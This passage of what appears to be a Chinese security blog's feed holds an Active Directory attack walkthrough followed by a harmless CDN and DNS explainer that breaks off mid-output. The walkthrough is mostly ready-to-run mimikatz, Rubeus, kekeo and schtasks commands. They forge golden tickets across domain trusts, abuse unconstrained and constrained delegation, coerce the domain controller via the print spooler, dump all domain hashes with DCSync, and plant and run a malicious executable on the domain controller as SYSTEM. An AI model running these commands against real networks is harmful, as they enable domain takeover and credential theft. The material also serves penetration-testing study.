<strong>利用域信任密钥获取目标域</strong></h3>\n<p>使用 mimikatz 获取 当前域的 SID 父域的 SID 子域域管的 NTLM 信任密钥</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /user:HACK$&quot; &quot;lsadump::trust /patch&quot; exit</span><br></pre></td></tr></table></figure>\n<p>rc4-hmac-hash  ==  NTLM hash</p>\n<p>在普通的域内用户中创建创建高权限票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;kerberos::golden /domain:子域 /sid:子域SID /sids:父域-519 /rc4:信任密</span><br><span class=\"line\">钥 /user:任意用户 /service:krbtgt /target:父域 /ticket:subdc_administrator.kirbi&quot;</span><br><span class=\"line\">exit</span><br><span class=\"line\">mimikatz.exe &quot;kerberos::golden /domain:abc.hack.com /sid:S-1-5-21-2902250016-</span><br><span class=\"line\">280749999-3752131090 /sids:S-1-5-21-2716900768-72748719-3475352185-519</span><br><span class=\"line\">/rc4:4101a9a4410052f42a70990e5371a5b9 /user:administrator /service:krbtgt</span><br><span class=\"line\">/target:hack.com /ticket:administrator.kirbi&quot; exit</span><br></pre></td></tr></table></figure>\n<p>上传 asktgs.exe 和 kirbikator.exe 工具，asktgs.exe 伪造票据，kirbikator.exe 注入票据</p>\n<p>创建 CIFS 服务的票据进行复制文件的操作</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell asktgs.exe administrator.kirbi CIFS/DC.hack.com</span><br></pre></td></tr></table></figure>\n<p>将票据注入内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell kirbikator.exe lsa CIFS.DC.hack.com.kirbi</span><br></pre></td></tr></table></figure>\n<p>访问域控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell dir \\\\dc.hack.com\\c$</span><br></pre></td></tr></table></figure>\n<p>服务恶意文件，如果复制失败，请注入 host 服务票据。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell copy 2.exe \\\\dc.hack.com\\c$</span><br></pre></td></tr></table></figure>\n<p>伪造 host 服务，进行创建计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell asktgs.exe administrator.kirbi host/DC.hack.com</span><br></pre></td></tr></table></figure>\n<p>将票据注入内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell kirbikator.exe lsa host.DC.hack.com.kirbi</span><br></pre></td></tr></table></figure>\n<p>创建计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\\1.exe /ru system /f</span><br></pre></td></tr></table></figure>\n<p>执行计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /run /s dc.hack.com /i /tn &quot;test&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用krbtgt哈希值获取目标域\"><a class=\"markdownIt-Anchor\" href=\"#利用krbtgt哈希值获取目标域\">#</a> <strong>利用 krbtgt 哈希值获取目标域</strong></h3>\n<p>获取 Krbtgt 散列</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::lsa /patch /user:krbtgt</span><br></pre></td></tr></table></figure>\n<p>获取关键信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::trust /patch</span><br></pre></td></tr></table></figure>\n<p>构造并注入黄金票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Kerberos::golden /user:administrator /domain:当前域名 /sid:当前SID /sids:目标域SID-</span><br><span class=\"line\">519 /krbtgt:krbtgt散列 /ptt Kerberos::golden /user:administrator /domain:abc.hack.com /sid:S-1-5-21-2902250016-280749999-3752131090 /sids:S-1-5-21-2716900768-72748719-3475352185-519 /krbtgt:96d6714b1995e9d724a88ada46e9f30f /ptt</span><br></pre></td></tr></table></figure>\n<p>访问目标域</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dir \\\\dc.hack.com\\c$</span><br></pre></td></tr></table></figure>\n<h3 id=\"域内委派攻击概述\"><a class=\"markdownIt-Anchor\" href=\"#域内委派攻击概述\">#</a> <strong>域内委派攻击概述</strong></h3>\n<p>域委派是指将域内用户的权限委派给服务账户，使得服务账号能够以用户的权限在域内展开活动。委派是域中的一种安全设置，可以允许某个机器上的服务代表某个用户去执行某个操作，主要分为三种：</p>\n<p>1、非约束性委派</p>\n<p>2、约束性委派</p>\n<p>3、基于资源的约束性委派</p>\n<p>一个域内用户访问 WEB 服务，但是一些资源在文件服务上，这个时候就需要委派攻击</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219145249494.png\" alt=\"image-20221219145249494\"></p>\n<p>在域内只有主机账号和服务账号才有委派属性</p>\n<p>主机账号：活动目录中的 computers 组内的计算机，也被称为机器账号。</p>\n<p>服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer,MYSQL 等；域用户通过注册 SPN 也能成为服务账号。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net user test123 Admin@123 /add /domain 创建一个普通用户</span><br><span class=\"line\">setspn -U -A priv/test test123 注册为服务账号</span><br></pre></td></tr></table></figure>\n<h3 id=\"非约束委派攻击\"><a class=\"markdownIt-Anchor\" href=\"#非约束委派攻击\">#</a> <strong>非约束委派攻击</strong></h3>\n<p><strong>利用非约束委派域控主动访问控制域</strong></p>\n<p>1、使用 Adfifind 查询域内非约束委派机器账号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369) (userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>\n<p>查询具有委派的服务账号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)</span><br><span class=\"line\">(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn</span><br></pre></td></tr></table></figure>\n<p>3、这个时候如果域管访问了 pc-web 机器我们的内存中就会有域管的 TGT，就可以访问任意机器了，在</p>\n<p>与域控上执行访问 PC-WEB (在域控上执行)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use \\\\PC-WEB.HACK.COM /user:hack\\administrator Admin@123</span><br></pre></td></tr></table></figure>\n<p>4、去 pc-web 导出内存中的票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>\n<p>4、进行票据传递就可以获取域控的权限了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz kerberos::ptt [0;54acdf]-2-0-60a10000-Administrator@krbtgt\u0002HACK.COM.kirbi</span><br></pre></td></tr></table></figure>\n<p>5、访问域控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell dir \\\\dc.hack.com\\c$</span><br></pre></td></tr></table></figure>\n<p><strong>利用非约束委派域控被动访问控制域控</strong></p>\n<p>控制了域内的一台机器 OA，并且该机器的服务账号配置了非约束委派，如下：一般域管不会主动访问我们，我们可以 利用 Windows 打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRNRpcRemoteFindFirstPrinterChangeNotification (Ex) 方法强制任何运行了 Spooler 服务的计算机以通过 Kerberos 或 NTLM 对攻击者选择的目标进行身份验证。非约束性委派主机结合 Spooler 打印机服务漏洞，让域控机器 DC 强制访问已控的具有本地管理员权限的非约束性委派机器 OA ，从而拿到域管理员的 TGT，进而接管域控。（2008 机器可能复现不了，因为版本的问题）</p>\n<p>进行实验之前一定要把所有的防火墙关闭</p>\n<p>1、首先利用 Rubeus 在 OA 上以本地管理员权限执行以下命令，每隔一秒监听来自域控机器 DC 的登录信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Rubeus.exe monitor /interval:1 /filteruser: DC$</span><br></pre></td></tr></table></figure>\n<p>再利用 SpoolSample 强制域控打印机回连，需在域用户进程上执行，所以这里切换成了普通域用户帐号去执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SpoolSample.exe DC OA</span><br></pre></td></tr></table></figure>\n<p>Rubeus 导入票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Rubeus.exe ptt /ticket:票据</span><br></pre></td></tr></table></figure>\n<p>获取域内用户的 hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::dcsync /all /csv</span><br></pre></td></tr></table></figure>\n<h3 id=\"约束性委派攻击\"><a class=\"markdownIt-Anchor\" href=\"#约束性委派攻击\">#</a> <strong>约束性委派攻击</strong></h3>\n<p>当这个用户不在域内，他在出差，不能使用 kerberos 去认证，只能使用其他协议认证 web 系统，那同样 WEB 系统也需要访问文件服务的资源，这个时候如何认证呢</p>\n<p>Widnows Server 2003 之后微软引入了非约束委派。由于非约束委派的不安全性或者场景受限（配置了非约束委派的机器在 LSASS 中缓存了用户的 TGT 票据可模拟用户去访问域中任意服务），微软于 2007 年为 Kerberos 协议进行扩展引入 S4U (service for user) 协议，该协议分为两个子协议</p>\n<p>1、S4u2self（Service for User to Self）</p>\n<p>2、S4U2proxy（Service for User to Proxy）</p>\n<p>这两个扩展都允许服务代表用户从 KDC 请求票证</p>\n<p>约束委派限制了 S4U2proxy 协议的请求范围，使得配置了委派属性的服务只能模拟用户身份访问<strong>特定</strong>的其他服务</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219171904181.png\" alt=\"image-20221219171904181\"></p>\n<p>存在的问题</p>\n<p>1、服务账号 B 可以代表 A 申请访问 B 的票据，那么可不可以代表域管申请域管访问 B 的票据呢？在这个过程中，不需要域管参与，服务 B 自身就可以完成</p>\n<p>2、服务账号 B 可以代表 A 申请访问 C 的票据，那么可不可以代表域管申请域管访问 C 的票据呢？在这个过程中，不需要域管参与，服务 B 自身就可以完成</p>\n<p><strong>约束性委派攻击流程</strong></p>\n<p>用户（A）访问 WEB 系统（B）,B 代表 A 去向 KDC 申请访问 B 的 TGT 和 ST1 (使用 S4u2self), 用户 A 拿到了 ST1 就可以访问 B 了，如果在 B 上配置了约束性委派（A 到 C 的约束委派），则 B 能够使用 S4U2Proxy 协议将用户发给自己的可转发的 ST1 票据以用户的身份发给 KDC,KDC 返回 B 一个访问 C 的票据 ST2，这样 B 就可以以用户的身份访问 C</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219172826955.png\" alt=\"image-20221219172826955\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.通过NTLM或者其他认证</span><br><span class=\"line\">2.B代表A申请A访问B的票据(TGT和ST1)</span><br><span class=\"line\">3.KDC返回用户的TGT和ST1票据给B</span><br><span class=\"line\">4.B把ST1票据给A</span><br><span class=\"line\">5.A用ST1去访问B</span><br><span class=\"line\">6.B拿着A的ST1作为证据，去申请访问C的ST2</span><br><span class=\"line\">7.B用ST2票据访问C</span><br></pre></td></tr></table></figure>\n<p>伪造 A 的 TGT，向 KDC 申请 ST1，有了 ST1，可以使用 ST1 申请配置了对应服务的 ST2</p>\n<p>我们已经控制了 ZS 的电脑，发现该电脑配置了约束性的委派，并且可以读取到该电脑的机器用户的 HASH 值</p>\n<p>1、查询约束性委派的机器和用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查询约束委派机器账户</span><br><span class=\"line\">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br><span class=\"line\">查询约束委派服务账户</span><br><span class=\"line\">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>\n<p>2、使用 mimikatz 获取机器账户 NTLM Hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>\n<p>3、使用 kekeo 申请配置了约束委派机器账户 PC-ZS$ 的 TGT</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kekeo &quot;tgt::ask /user:PC-ZS$ /NTLM:bd41aace231471169d848817a2c46178 /domain:hack.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n<p>利用 TGT 通过伪造 S4U 请求以 administrator 身份访问 PC-ZS 的 ST</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kekeo &quot;tgs::s4u /tgt:TGT_PC-ZS$@HACK.COM_krbtgt~hack.com@HACK.COM.kirbi /user:Administrator@hack.com /service:cifs/dc.hack.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n<p>mimkatz 注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz kerberos::ptt TGS_Administrator@hack.com@HACK.COM_cifs~dc.hack.com@HACK.COM.kirbi</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/11/27/CDN/",
            "url": "http://example.com/2022/11/27/CDN/",
            "title": "CDN&DNS",
            "date_published": "2022-11-27T05:38:45.000Z",
            "content_html": "<h1 id=\"cdn\"><a class=\"markdownIt-Anchor\" href=\"#cdn\">#</a> CDN</h1>\n<h2 id=\"0x00-cdn概述\"><a class=\"markdownIt-Anchor\" href=\"#0x00-cdn概述\">#</a> 0x00 CDN 概述</h2>\n<p><strong>CDN</strong> 英文全称 <code>Content Delivery Network</code> ，中文翻译即为<strong>内容分发网络</strong>。它是建立并覆盖在承载网之上，由分布在不同区域的边缘节点服务器群组成的分布式网络。</p>\n<p>CDN 这个技术其实说起来并不复杂，最初的核心理念，就是<strong>将内容缓存在终端用户附近</strong>。</p>\n<p>具体来说，CDN 就是采用更多的缓存服务器（CDN 边缘节点），布放在用户访问相对集中的地区或网络中。当用户访问网站时，利用全局负载技术，将用户的访问指向距离最近的缓存服务器上，由缓存服务器响应用户请求。</p>\n<p>镜像服务器是源内容服务器的完整复制。而 CDN，是部分内容的缓存，智能程度更高。</p>\n<p><strong>CDN = 更智能的镜像 + 缓存 + 流量导流</strong>。</p>\n<h2 id=\"0x01-cdn应用场景\"><a class=\"markdownIt-Anchor\" href=\"#0x01-cdn应用场景\">#</a> <strong>0x01 CDN 应用场景</strong></h2>\n<h6 id=\"1-网站站点应用加速\"><a class=\"markdownIt-Anchor\" href=\"#1-网站站点应用加速\">#</a> <strong>1、网站站点 / 应用加速</strong></h6>\n<p>站点或者应用中大量静态资源的加速分发，建议将站点内容进行动静分离，动态文件可以结合云服务器 ECS，静态资源如各类型图片、html、css、js 文件等，建议结合 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9wcm9kdWN0L2Nvcz9mcm9tPTEwNjgw\">对象存储</span> OSS 存储海量静态资源，可以有效加速内容加载速度，轻松搞定网站图片、短视频等内容分发。</p>\n<h6 id=\"2-视音频点播大文件下载分发加速\"><a class=\"markdownIt-Anchor\" href=\"#2-视音频点播大文件下载分发加速\">#</a> <strong>2、视音频点播 / 大文件下载分发加速</strong></h6>\n<p>支持各类文件的下载、分发，支持在线点播加速业务，如 mp4、flv 视频文件或者平均单个文件大小在 20M 以上，主要的业务场景是视音频点播、大文件下载（如安装包下载）等，建议搭配对象存储 OSS 使用，可提升回源速度，节约近 2/3 回源带宽成本。</p>\n<h6 id=\"3-视频直播加速\"><a class=\"markdownIt-Anchor\" href=\"#3-视频直播加速\">#</a> <strong>3、视频直播加速</strong></h6>\n<p>视频流媒体直播服务，支持媒资存储、切片转码、访问鉴权、内容分发加速一体化解决方案。结合弹性伸缩服务，及时调整服务器带宽，应对突发访问流量；结合媒体转码服务，享受高速稳定的并行转码，且任务规模无缝扩展。</p>\n<h6 id=\"4-移动应用加速\"><a class=\"markdownIt-Anchor\" href=\"#4-移动应用加速\">#</a> <strong>4、移动应用加速</strong></h6>\n<p>移动 APP 更新文件（apk 文件）分发，移动 APP 内图片、页面、短视频、UGC 等内容的优化加速分发。提供 httpDNS 服务，避免 DNS 劫持并获得实时精确的 DNS 解析结果，有效缩短用户访问时间，提升用户体验。</p>\n<h2 id=\"0x01-cdn网络的组成\"><a class=\"markdownIt-Anchor\" href=\"#0x01-cdn网络的组成\">#</a> 0x01 CDN 网络的组成</h2>\n<p>一个 CDN 网络主要由以下几部分组成：内容缓存设备、内容分发管理设备、本地负载均衡交换机、GSLB 设备和 CDN 管理系统，其网络结构如下图所示：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20130609113946968\" alt=\"img\"></p>\n<p><strong>内容缓存设备 Cache</strong>：</p>\n<p>用于缓存内容实体和对缓存内容进行组织和管理。当有用户访问该客户内容时，直接由各缓存服务器响应用户的请求。</p>\n<p><strong>内容分发管理设备</strong>：</p>\n<p>主要负责核心 Web 服务器内容到 CDN 网络内缓存设备的内容推送、删除、校验以及内容的管理、同步。</p>\n<p><strong>GSLB 设备</strong>：</p>\n<p>则实现 CDN 全网各缓存节点之间的资源负载均衡，它与各节点的 SLB 设备保持通信，搜集各节点缓存设备的健康状态、性能、负载等，自动将用户指引到位于<strong>其地理区域中的最近服务器</strong>或者引导用户<strong>离开拥挤的网络和服务器</strong>。还可以通过使用多站点的内容和服务来提高容错性和可用性，防止因本地网或区域网络中断、断电或自然灾害而导致的故障。</p>\n<blockquote>\n<p>不用 CDN 技术时，使用 GSLB 设备可以为用户选择最合适的服务器，但受 Web 服务器的负荷和传输距离等因素的影响，响应速度依然经常不能满足用户的需求。这一问题的解决方案就是在传输网络上利用缓存技术使得 Web 服务数据流能够就近访问。内容分发网络（CDN）正是这种思想的一个实现，CDN 使用 GSLB 设备将用户引导到最合适的缓存节点（距离近，负载低），使得用户在访问静态内容时获得更好的体验。</p>\n</blockquote>\n<p><strong>CDN 管理系统</strong>：</p>\n<p>实现对全网设备的管理，对系统的配置。它不仅能对系统中的各个设备进行实时监控，对各种故障产生相应的告警，还能实时观测到系统中总的流量以及各节点的流量，并保存在系统的数据库中，作为统计分析的基础数据，并对日志文件进行管理、报告，作为计费的基础数据。</p>\n<h2 id=\"0x02-cdn-原理\"><a class=\"markdownIt-Anchor\" href=\"#0x02-cdn-原理\">#</a> 0x02 CDN 原理</h2>\n<h3 id=\"cdn-解析流程\"><a class=\"markdownIt-Anchor\" href=\"#cdn-解析流程\">#</a> CDN 解析流程</h3>\n<p>如果某个用户想要访问优酷的视频点播内容，那么：</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125204154043.png\" alt=\"image-20221125204154043\" style=\"zoom:67%;\" />\n<blockquote>\n<p>①、当用户点击 APP 上的内容，APP 会根据 URL 地址去<strong>本地 DNS</strong>（域名解析系统）寻求 IP 地址解析。</p>\n<p>②、当用户点击网站页面上的内容 URL，经过本地 DNS 系统解析，DNS 系统会最终将域名的解析权交给 CNAME 指向的 CDN 专用 DNS 服务器。</p>\n<p>③、CDN 专用 DNS 服务器，将 CDN 的全局负载均衡设备 IP 地址返回用户。也就是上面所说的 GSLB 设备</p>\n<p>④、用户向<strong> CDN 的负载均衡设备</strong>发起内容 URL 访问请求。</p>\n<p>⑤、CDN 负载均衡设备根据用户 IP 地址，以及用户请求的内容 URL，选择一台用户所属区域的<strong>缓存服务器</strong>。</p>\n<p>⑥、负载均衡设备告诉用户这台缓存服务器的 IP 地址，让用户向所选择的缓存服务器发起请求。</p>\n<p>⑦、用户向缓存服务器发起请求，缓存服务器响应用户请求，将用户所需内容传送到用户终端。</p>\n<p>⑧、如果这台缓存服务器上并没有用户想要的内容，那么这台缓存服务器就要网站的<strong>源服务器</strong>请求内容。</p>\n<p>⑨、源服务器返回内容给缓存服务器，缓存服务器发给用户，并根据用户自定义的缓存策略，判断要不要把内容缓存到缓存服务器上。</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/u6pjybbkxn.png\" alt=\"img\"></p>\n<blockquote>\n<ol>\n<li>当终端用户（北京）向 <code>www.a.com</code>  下的指定资源发起请求时，首先向 LDNS（本地 DNS）发起域名解析请求。</li>\n<li>LDNS 检查缓存中是否有 <code>www.a.com</code>  的 IP 地址记录。如果有，则直接返回给终端用户；如果没有，则向授权 DNS 查询。</li>\n<li>当授权 DNS 解析 <code>www.a.com</code>  时，返回域名 CNAME www.a.tbcdn.com 对应 IP 地址。</li>\n<li>域名解析请求发送至阿里云 DNS 调度系统，并为请求分配最佳节点 IP 地址。</li>\n<li>LDNS 获取 DNS 返回的解析 IP 地址。</li>\n<li>用户获取解析 IP 地址。</li>\n<li>用户向获取的 IP 地址发起对该资源的访问请求。</li>\n</ol>\n<ul>\n<li>如果该 IP 地址对应的节点已缓存该资源，则会将数据直接返回给用户，例如，图中步骤 7 和 8，请求结束。</li>\n<li>如果该 IP 地址对应的节点未缓存该资源，则节点向源站发起对该资源的请求。获取资源后，结合用户自定义配置的缓存策略，将资源缓存至节点，例如，图中的北京节点，并返回给用户，请求结束。</li>\n</ul>\n</blockquote>\n<blockquote>\n<ol>\n<li>CDN 的加速资源是跟域名绑定的。</li>\n<li>通过域名访问资源，首先是通过 DNS 分查找离用户最近的 CDN 节点（边缘服务器）的 IP</li>\n<li>通过 IP 访问实际资源时，如果 CDN 上并没有缓存资源，则会到源站请求资源，并缓存到 CDN 节点上，这样，用户下一次访问时，该 CDN 节点就会有对应资源的缓存了。</li>\n</ol>\n</blockquote>\n<p>应用 CDN 后，DNS 返回的不再是 IP 地址，而是一个 CNAME (Canonical Name) 别名记录，指向 CDN 的全局负载均衡 GSLB, GSLB 实际上在域名解析的过程中承担了中间人（或者说代理）的角色，这是 CDN 实现的关键</p>\n<p>CDN 主要功能是在不同的地点缓存内容，通过负载均衡技术，将用户的请求定向到最合适的缓存服务器上去获取内容，比如说，是北京的用户，我们让他访问北京的节点，深圳的用户，我们让他访问深圳的节点。通过就近访问，加速用户对网站的访问。解决 Internet 网络拥堵状况，提高用户访问网络的响应速度。</p>\n<p>由于没有返回 IP 地址，于是本地 DNS 会向负载均衡系统再发送请求 ，则进入到 CDN 的全局负载均衡系统 GSLB 进行智能调度：</p>\n<ul>\n<li>看用户的 IP 地址，查表得知地理位置，找相对最近的边缘节点</li>\n<li>看用户所在的运营商网络，找相同网络的边缘节点</li>\n<li>检查边缘节点的负载情况，找负载较轻的节点</li>\n<li>其他，比如节点的 “健康状况”、服务能力、带宽、响应时间等</li>\n</ul>\n<p>结合上面的因素，得到最合适的边缘节点，然后把这个节点返回给用户，用户就能够就近访问 CDN 的缓存代理</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/fdde5787e61870ee5d997f1ca89d0870.png\" alt=\"img\"></p>\n<p>我们可以用 dig 查看 dns 解析结果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos ~]# dig www.bilibili.com</span><br><span class=\"line\"></span><br><span class=\"line\">; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.7 &lt;&lt;&gt;&gt; www.bilibili.com</span><br><span class=\"line\">;; global options: +cmd</span><br><span class=\"line\">;; Got answer:</span><br><span class=\"line\">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 60626</span><br><span class=\"line\">;; flags: qr rd ra; QUERY: 1, ANSWER: 22, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class=\"line\"></span><br><span class=\"line\">;; QUESTION SECTION:</span><br><span class=\"line\">;www.bilibili.com.\t\tIN\tA</span><br><span class=\"line\"></span><br><span class=\"line\">;; ANSWER SECTION:</span><br><span class=\"line\">www.bilibili.com.\t144\tIN\tCNAME\ta.w.bilicdn1.com.</span><br><span class=\"line\">a.w.bilicdn1.com.\t169\tIN\tCNAME\tct.w.bilicdn1.com.</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t183.131.147.27</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t183.131.147.28</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t183.131.147.29</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t183.131.147.30</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t183.131.147.48</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t61.147.236.42</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t117.21.179.18</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t61.147.236.44</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t61.147.236.45</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t61.147.236.46</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t116.207.137.66</span><br><span 